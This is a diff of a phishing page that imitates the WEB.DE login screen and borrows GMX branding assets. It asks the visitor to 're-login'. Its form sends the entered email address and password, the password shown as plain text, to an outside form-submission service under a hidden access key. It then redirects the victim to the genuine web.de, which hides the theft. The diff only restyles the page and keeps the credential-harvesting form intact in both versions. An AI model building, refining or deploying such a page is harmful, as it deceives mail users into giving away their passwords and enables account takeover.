@@ -1,77 +1,19 @@
 <!DOCTYPE html>
+<html lang="en">
 
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WEB.DE</title>
+    <title>Document</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="Mobiler GMX Login: Auf dieser Seite können Sie sich mit dem Smartphone oder Tablet einfach und sicher unterwegs in Ihr GMX Postfach einloggen.">
+    <meta name="robots" content="noindex">
+    <link rel="shortcut icon" type="image/x-icon" href="https://mm.gmx.net/img.ui-portal.de/cd/ci/gmx.net/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-itunes-app" content="app-id=417352269">
+    <link rel="stylesheet" type="text/css" href="https://mm.gmx.net/loginapplication/login/resource/gui.GuiResources/::/gui/styles/default/themes/uni-ver-98661918DDD3D8BECF2096F5694034CC.css?-gmxnet">
+
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 50vh;
-            background-color: #f3f3f3;
-            color: black;
-            font-family: sans-serif;
-        }
-        
-        .page-box {
-            width: 100%;
-            max-width: 1000px;
-            min-height: 90vh;
-            background: #f3f3f3;
-            box-shadow: black;
-            padding-right: 20px;
-            padding-left: 20px;
-            border-radius: 5px;
-            text-align: center;
-            height: auto;
-        }
-        
-        .email {
-            margin-bottom: 15px;
-            color: black;
-            border-radius: 3px;
-            padding-top: 15px;
-            padding-bottom: 15px;
-            border: none;
-            width: 60%;
-        }
-        
-        .passwort {
-            margin-bottom: 5px;
-            color: black;
-            border-radius: 3px;
-            padding-top: 15px;
-            padding-bottom: 15px;
-            border: none;
-            width: 60%;
-        }
-        
-        .submit {
-            margin-top: 20px;
-            color: black;
-            border-radius: 3px;
-            padding-top: 15px;
-            padding-bottom: 15px;
-            border: none;
-            width: 20%;
-            text-align: center;
-            background-color: #ffd800;
-            font-weight: bold;
-        }
-        
-        main {
-            display: flex;
-            justify-content: center;
-        }
-        
-        .form-group {
-            margin-bottom: 5%;
-            border-radius: 5px;
-        }
-        
         .img {
             display: flex;
             padding-left: 2%;
@@ -81,69 +23,115 @@
             border-top: 4px solid #ffd800;
             padding: 8px;
             outline: none;
-            border-bottom-color: rgb(53, 52, 52);
-            border-bottom: 1px solid rgb(53, 52, 52);
+            border-bottom: 0.5px solid rgb(53, 52, 52);
         }
         
-        div {
+        .email {
+            margin-bottom: 5px;
+            color: black;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: 1px solid rgb(83, 82, 82);
+            width: 100%;
+        }
+        
+        .passwort {
+            margin-bottom: 5px;
+            color: black;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: 1px solid rgb(83, 82, 82);
+            width: 100%;
+        }
+        
+        .submit {
+            margin-top: 20px;
+            color: white;
+            border-radius: 3px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            border: none;
+            width: 100%;
             text-align: center;
+            background-color: #ffd800;
         }
         
-        form {
-            margin: 2em 10%;
-            width: 80%;
+        .pass {
+            margin-top: 20px;
         }
     </style>
-
 </head>
 
 <body>
-    <div class="page-box">
+    <div class="main-layout">
         <header>
             <div class="img">
-                <img src="image/dp.png" alt="Not supported" width="10%" height="auto">
+                <img src="image/dp.png" alt="Not supported" width="8%" height="auto">
                 <div class="search">
                 </div>
             </div>
 
-            <div>
-                <img src="image/download.png" width="15%" style="padding-top: 5%;">
-            </div>
-
-            <div>
-                <h1>Bitte erneut einloggen</h1>
-            </div>
-
-            <div>
-                <p>Bitte melden Sie sich mit Ihrem WEB.DE <br> Nutzernamen und Ihrem Passwort an.</p>
-            </div>
         </header>
-
+        </header>
         <main>
-            <form action="https://api.web3forms.com/submit" method="POST">
+            <div class="centered-content centered-content--narrow">
 
-                <input type="hidden" name="access_key" value="4313fbb1-01f5-4f4d-961b-a88688bc40d4">
-
-                <input type="hidden" name="redirect" value="https://web.de">
-
-                <div>
-                    <input type="email" name="text" placeholder=" WEB.DE E-mail Addresse" maxlength="50" required class="email">
+                <div class="content-title">
+                    <div class="content-title__logo">
+                        <img src="image/download.png" alt="Not supported" width="15%" height="auto">
+                    </div>
+                    <h1><b>Bitte erneut einloggen</b></h1>
+                    <p id="loginText">
+                        Bitte melden Sie sich mit Ihrem WEB.DE Nutzernamen und Ihrem Passwort an.
+                    </p>
                 </div>
 
-                <div>
-                    <input type="text" name="text" placeholder=" Passwort eingeben" required class="passwort">
-                </div>
+                <form action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="4313fbb1-01f5-4f4d-961b-a88688bc40d4">
 
-                <div class="form-group">
-                    <input type="submit" value="Login" style="border-width:0;" class="submit">
-                </div>
-            </form>
-        </main>
+                    <input type="hidden" name="redirect" value="https://Web.de">
 
-        <section style="text-align: center; font-family: sans-serif; color:#2c2a2a">
-            <h3>Neu bei WEB.DE?</h3>
-        </section>
+                    <div class="add">
+                        <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">WEB E-Mail-Adresse</label>
+                        <input type="text" name="text" placeholder=" WEB.DE E-mail Addresse" maxlength="50" required class="email">
+                    </div>
+
+                    <div class="pass">
+                        <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
+                        <input type="text" name="text" placeholder=" Passwort eingeben" required class="passwort">
+                    </div>
+
+                    <div>
+                        <input type="submit" value="Login" class="submit">
+                    </div>
+                </form>
+
+                <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block" href="#">
+            Passwort vergessen?
+        </a>
+                <hr class="centered-content__line-break a-mb-space-4">
+                <div class="a-ta-c a-mb-space-4">
+                    <h2 class="a-mb-space-2.5">
+                        Neu bei WEB?
+                    </h2>
+                    <a class="pos-button pos-button--link pos-button--block" href="#">
+                Jetzt kostenlos registrieren!
+            </a>
+                </div>
+            </div>
+
+            <div class="footer">
+                <a class="footer__link" href="#">Impressum</a>
+                <a class="footer__link" href="#">Verträge hier kündigen</a>
+                <a class="footer__link" href="#">AGB</a>
+                <a class="footer__link" href="#">Datenschutz</a>
+            </div>
+
     </div>
+    </div>
+    </main>
 </body>
 
 </html>
